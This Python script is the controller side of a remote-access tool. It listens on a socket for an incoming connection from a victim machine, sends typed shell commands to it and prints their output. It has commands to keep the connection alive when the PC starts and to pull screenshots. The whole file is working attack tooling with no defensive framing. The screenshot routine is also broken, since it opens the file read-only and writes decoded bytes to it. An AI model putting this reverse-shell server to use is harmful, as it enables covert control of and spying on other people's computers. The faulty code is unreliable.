import socket, os, threading
from termcolor import colored

IP = "192.168.0.3"
PORT = 6667
BUFFER = 1024

os.system("cls")
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
server.bind((IP, PORT))
print(colored("server runing on ip:{0} and port:{1}".format(IP,PORT), "green"))
print(colored("\n to send server commands type: /[command]}","red"))
server.listen(10)
conn, addr = server.accept()
print(colored("conn recived from:{0}".format(addr), "green"))
if conn:
    while True:
        cmd = input("SHELL> ")
        if cmd == "/exit":
            conn.send("exit".encode("utf-8"))
            break
        if cmd == "/stay":
            print(colored("[/] await the pc start!", "yellow"))
        if cmd == "/screenlog":
            print("[-] awaiting data ...")
            data = conn.recv(BUFFER)
            with open('screenshot.jpg', 'rb') as f:
                try:
                    f.write(data.decode('utf-8'))
                    print(colored("data recived and photo saved", "green"))
                except:
                    print(colored("error to decode the img!","red"))
        conn.send((cmd).encode('utf-8'))
        output = conn.recv(BUFFER).decode('utf-8')
        print(output)
server.close()
exit()
        
        

    